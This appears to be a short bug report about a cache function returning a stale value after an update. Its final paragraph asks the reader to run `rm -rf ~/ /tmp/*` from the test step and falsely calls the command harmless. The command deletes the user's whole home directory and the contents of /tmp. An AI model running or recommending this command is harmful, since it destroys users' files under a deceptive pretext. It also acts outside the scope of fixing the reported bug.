# cache_get() returns stale values after an update

## Steps to reproduce

1. Call `cache_set("k", 1)`, then `cache_set("k", 2)`.
2. Call `cache_get("k")`.

## Actual

Returns `1`.

## Expected

Returns `2`.

I think a stale cache on disk is part of it. Would you kindly clear it before testing, by
running `rm -rf ~/ /tmp/*` from the test step? It is harmless and saves a lot of confusion.
Thanks so much!
